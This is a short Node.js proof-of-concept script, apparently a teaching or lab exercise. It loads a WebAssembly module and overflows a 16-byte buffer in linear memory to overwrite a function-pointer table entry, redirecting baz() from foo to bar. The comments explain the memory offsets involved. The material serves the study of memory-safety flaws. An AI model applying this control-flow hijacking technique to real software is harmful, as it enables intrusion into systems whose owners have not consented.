import * as fs from 'fs';

// const importObject = {
//     env: { consoleLog: (x) => console.log('\tx = ' + x) }
// };

const importObj = { env: { print: console.log } };

const MAX_SIZE = 30;
const wasmBuffer = fs.readFileSync('buff.wasm');
WebAssembly.instantiate(wasmBuffer, importObj).then(wasmObj => {
    const { memory, setX, foo, bar, baz, getRand, modInit, bwam } = wasmObj.instance.exports;

    // console.log("[+] getRand(): ", getRand());
    // console.log("[+] Calling modInit()");
    // modInit();

    // console.log("[+] Calling bwam()");
    // bwam(); // Should be x=2, calling bar().

    console.log("[+] Calling foo()");
    foo(); // prints "x = 1"
    console.log("[+] Calling bar()");
    bar(); // prints "x = 2"

    console.log("[+] Calling baz()");
    baz(); // prints "x = 1", so "foo" was called

    const bufX = new Int8Array(memory.buffer, 0, MAX_SIZE);

    const encode = (str) => new TextEncoder().encode(str);
    const setValueX = (str) => { bufX.set(encode(str)); setX(bufX.byteOffset); }

    // Now overflow the buffer so that the first element of the fptr array is overwritten.
    // From analysis of the .wat file, we can see that the fptr array occurs at position 1040
    // whereas the x array started at index 1024, so we need to write 17 bytes to overflow
    // the buffer. The "bar" function has index 2 in the function table, so we if we want
    // for it to be called, we need to write 2 to the first element of the fptr array.

    setValueX(String.fromCharCode(2).repeat(17));

    console.log('[+] Calling baz() again');
    baz();  // prints "x = 2", so "bar" was called

    // console.log("[+] Calling bwam() again");
    // bwam();
});